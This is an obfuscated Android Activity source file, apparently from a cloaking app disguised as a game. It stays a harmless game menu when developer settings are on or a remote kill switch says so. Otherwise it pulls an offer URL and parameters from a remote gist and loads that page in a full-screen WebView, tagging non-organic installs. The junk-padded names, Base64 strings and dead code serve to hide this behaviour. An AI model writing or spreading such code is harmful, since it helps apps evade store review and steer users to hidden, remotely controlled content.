package com.cnoi.boulfaf;

import static com.cnoi.boulfaf.FboulfafK.stboboulfafafrDeep;
import static com.cnoi.boulfaf.ParseboulfafStr.decoboulfafde;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class C9B extends AppCompatActivity {

    private ProgressBar proboulfafgressBar;
    private WebView webVboulfafiew;
    private String liboulfafnk;
    private ValueCallback<Uri[]> myFilePboulfafathCallback;
    private SharedPreferences sPboulfafrefs;
    private String ofboulfaffer;
    private String fbboulfafId;
    public static final String URLboulfafD_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FILboulfafEST_CODE = 1;
    public static String keyDboulfafult;
    public static String statuboulfafFlyer;
    public static String strboulfaflyer;
    public static String ApboulfafId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.activity_boulfafmain);
        proboulfafgressBar = findViewById(R.id.progressBar);

        if ( ((android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0)) == 0)) {

            webVboulfafiew = findViewById(R.id.webView);
            webVboulfafiew.setWebChromeClient(new Myboulfafient());
            webVboulfafiew.setWebViewClient(new MyWeboulfafient());


            Retrofit retrboulfafofit = new Retrofit.Builder()
                    .baseUrl(ParseboulfafStr.GisboulfaftLink)
                    .build();
            Gistboulfafpi gisboulfaftApi = retrboulfafofit.create(Gistboulfafpi.class);
            Call<ResponseBody> gboulfafistQuery = gisboulfaftApi.getStrboulfafingUrl();

            donboulfafth(false);
            gboulfafistQuery.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
                    if (response.isSuccessful() & response.body() != null) {
                        try {
                            String urboulfafl = response.body().string();
                            String[] parboulfafams = urboulfafl.split("\\|");
                            ofboulfaffer = parboulfafams[0];
                            keyDboulfafult = parboulfafams[1];
                            fbboulfafId = parboulfafams[2];

                            FboulfafK fboulfafbook = new FboulfafK(fbboulfafId, C9B.this);
                            fboulfafbook.iniboulfaft();
                            fboulfafbook.setWboulfafebView(webVboulfafiew);

                            donboulfafth(false);

                            sPboulfafrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                            liboulfafnk = sPboulfafrefs.getString(URLboulfafD_PREF, null);


                            if (liboulfafnk != null) {
                                webVboulfafiew.loadUrl(liboulfafnk);
                            } else {
                                new Handler().postDelayed(() -> {
                                    staboulfafView(ofboulfaffer);
                                    donboulfafth(false);
                                }, 5210);
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else {
                        goboulfafame();
                    }
                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {
                    goboulfafame();
                }
            });

        } else {
            donboulfafth(false);
            goboulfafame();
        }
    }


    private void goboulfafame() {
        startActivity(new Intent(this, Menuboulfafctivity.class));
        finish();
    }

    void staboulfafView(String linboulfafk) {
        if (statuboulfafFlyer != null && statuboulfafFlyer.equals(decoboulfafde("Tm9uLW9yZ2FuaWM="))) {
            donboulfafth(false);
            String urboulfafl = linboulfafk + strboulfaflyer;
            webVboulfafiew.loadUrl(urboulfafl);
        } else if (stboboulfafafrDeep != null) {
            donboulfafth(false);
            ParseboulfafStr parboulfafserStr = new ParseboulfafStr();
            stboboulfafafrDeep = parboulfafserStr.pboulfafarse(stboboulfafafrDeep);
            String urboulfafl = linboulfafk + stboboulfafafrDeep;
            webVboulfafiew.loadUrl(urboulfafl);
        } else {
            if (keyDboulfafult.equals("NO")) {
                donboulfafth(false);
                goboulfafame();
            } else {
                donboulfafth(false);
                String uboulfafrl = new ParseboulfafStr().parsboulfafeOrganic(linboulfafk);
                webVboulfafiew.loadUrl(uboulfafrl);
            }
        }
    }


    @Override
    public void onBackPressed() {
        webVboulfafiew.goBack();
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILboulfafEST_CODE || myFilePboulfafathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK & data != null) {
            String datboulfaftring = data.getDataString();
            Uri[] reboulfafsult = new Uri[]{Uri.parse(datboulfaftring)};
            myFilePboulfafathCallback.onReceiveValue(reboulfafsult);
            myFilePboulfafathCallback = null;
        }
    }


    class Myboulfafient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            myFilePboulfafathCallback = filePathCallback;
            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decoboulfafde("aW1hZ2UvKg=="))), INPUT_FILboulfafEST_CODE);
            return true;
        }
    }

    class MyWeboulfafient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webVboulfafiew.setVisibility(View.VISIBLE);
            proboulfafgressBar.setVisibility(ProgressBar.INVISIBLE);

            if (url.contains(decoboulfafde("NDA0"))) {
                goboulfafame();
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editboulfafor = sPboulfafrefs.edit();
            editboulfafor.putString(URLboulfafD_PREF, url);
            editboulfafor.apply();
        }
    }

    public void donboulfafth(boolean bol) {
        if (bol) {
            Asdasdasdge aboulfafge = new Asdasdasdge();
            aboulfafge.setYear(10);
            ImmutableSboulfaftudent immutableStudent = new ImmutableSboulfaftudent("Andrew", aboulfafge);
            aboulfafge.setYear(30);
        }
    }
}

